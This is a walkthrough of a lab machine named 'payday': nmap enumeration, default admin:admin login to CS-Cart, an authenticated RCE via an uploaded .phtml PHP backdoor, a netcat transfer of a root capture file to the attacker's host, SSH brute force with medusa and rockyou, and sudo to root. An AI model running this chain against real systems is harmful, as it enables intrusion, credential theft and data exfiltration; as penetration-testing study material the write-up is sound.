

### Lab Details 

- Difficulty: Intermediate
- Type: Web, Linux Priv Esc

#### Enumeration
- run `nmap`
```
Host is up (0.00065s latency).
Not shown: 65527 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
| ssh-hostkey:
|   1024 f3:6e:87:04:ea:2d:b3:60:ff:42:ad:26:67:17:94:d5 (DSA)
|_  2048 bb:03:ce:ed:13:f1:9a:9e:36:03:e2:af:ca:b2:35:04 (RSA)
80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
|_http-title: CS-Cart. Powerful PHP shopping cart software
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: PIPELINING STLS SASL TOP CAPA UIDL RESP-CODES
|_ssl-date: 2026-03-29T18:54:14+00:00; +7s from scanner time.
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
143/tcp open  imap        Dovecot imapd
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
|_ssl-date: 2026-03-29T18:54:13+00:00; +6s from scanner time.
|_imap-capabilities: STARTTLS LOGINDISABLEDA0001 IMAP4rev1 THREAD=REFERENCES completed Capability UNSELECT LITERAL+ IDLE SORT OK LOGIN-REFERRALS NAMESPACE
445/tcp open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
993/tcp open  ssl/imap    Dovecot imapd
|_ssl-date: 2026-03-29T18:54:14+00:00; +7s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
|_imap-capabilities: AUTH=PLAINA0001 IMAP4rev1 THREAD=REFERENCES completed Capability UNSELECT LITERAL+ IDLE SORT OK LOGIN-REFERRALS NAMESPACE MULTIAPPEND
995/tcp open  ssl/pop3    Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
|_ssl-date: 2026-03-29T18:54:13+00:00; +6s from scanner time.
|_pop3-capabilities: PIPELINING SASL(PLAIN) USER TOP CAPA UIDL RESP-CODES
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.22
OS details: Linux 2.6.22
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.26a)
|   Computer name: payday
|   NetBIOS computer name:
|   Domain name:
|   FQDN: payday
|_  System time: 2026-03-29T14:54:12-04:00
|_clock-skew: mean: 40m06s, deviation: 1h37m58s, median: 6s
|_nbstat: NetBIOS name: PAYDAY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```
#### Initial Foothold 
- visits port `80` presents `CS-Cart`
- attempt login with `admin:admin` and able to authenticate as admin
![[Pasted image 20260330032944.png]]
- search online for exploits, found authenticated RCE https://www.exploit-db.com/exploits/48891
```
## detailed steps found: https://gist.github.com/momenbasel/ccb91523f86714edb96c871d4cf1d05c
1. Visit "cs-cart" /admin.php and login (Remember: You need to login on **ADMIN** section not on the regular **USER** section).
2. Under **Look and Feel** section click on "**template editor**".
3. And under that section, upload your malicious **.php** file, make sure you rename it to **.phtml** before you upload.
4. If successful, you should be able to get a **RCE**.
5. For example, grab this file -> [https://raw.githubusercontent.com/F-Masood/php-backdoors/main/whoami.php](https://raw.githubusercontent.com/F-Masood/php-backdoors/main/whoami.php) and rename it to whoami.phtml
6. Now, visit http://[victim]/skins/whoami.phtml
7. And you should see '**www-data**' or '**apache**' etc as the output.
```
- following the steps able to receive a shell as user `www-data`
#### Lateral Movement (If any)
- found another user named `patrick` with excessive privileges 
```
$ id patrick
uid=1000(patrick) gid=1000(patrick) groups=1000(patrick),4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),115(lpadmin)

```
- load and run `linpeas` found a `cap` file in roots directory 
```
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                                       
/root/
/root/.ssh
/root/.ssh/authorized_keys
/root/capture.cap
```
- download the `cap` file
```
## on target sending
$ nc 192.168.45.161 9000 < /root/capture.cap

## on attacker - receving 
$ nc -lvnp 9000 > capture.cap
```
- analyze using `wireshark`
![[Pasted image 20260330160116.png]]
- obtained plaintext password 
```
ilovesecuritytoo
```
- however unable to login using the password
- attempt with bruteforce and found password for user `patrick`
```
$ medusa -h 192.168.55.39 -u patrick -P /usr/share/wordlists/rockyou.txt -M ssh -t 10
<SNIP>
2026-03-30 08:33:09 ACCOUNT FOUND: [ssh] Host: 192.168.55.39 User: patrick Password: patrick [SUCCESS]
<SNIP>
```


#### Privilege Escalation
- login to ssh as `patrick`, check `sudo -l`
- `patrick` is able to run all commands as root
```
patrick@payday:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for patrick:
User patrick may run the following commands on this host:
    (ALL) ALL
patrick@payday:~$ sudo ls /root
capture.cap  proof.txt
```
#### Resources

#### Lesson Learned
